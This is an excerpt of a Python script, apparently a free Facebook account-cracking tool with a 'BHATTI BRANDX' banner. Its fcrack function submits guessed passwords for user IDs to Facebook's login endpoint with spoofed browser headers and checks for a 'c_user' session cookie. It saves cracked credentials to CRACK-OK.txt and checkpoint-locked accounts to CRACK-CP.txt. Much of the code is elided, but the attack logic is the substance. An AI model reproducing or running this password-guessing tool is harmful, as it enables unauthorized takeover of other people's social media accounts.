...
\033[1;32m--------------------------------------------------
  ...
  ____  _    _       _______ _______ _____  
 |  _ \| |  | |   /\|__   __|__   __|_   _| 
 | |_) | |__| |  /  \  | |     | |    | |   
 |  _ <|  __  | / /\ \ | |     | |    | |   
 | |_) | |  | |/ ____ \| |     | |   _| |_  
...
--------------------------------------------------
[•] AUTHOR     : \033[1;32mBHATTI BRANDX\033[1;36m
[•] STATUS     : \033[1;32mFREE\033[1;34m
--------------------------------------------------
...
def fcrack(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			'accept-language': 'en-US,en;q=0.9',
			 ...
			 'referer': 'https://www.facebook.com/login/device-based/regular/login/?_rdc=1&_rdr&wtsid=rdr_0eYkoiZsvV5YMfVsU',
            ...
            if 'c_user' in log_cookies:
                ...
                open('CRACK-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
                ...
                open('CRACK-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
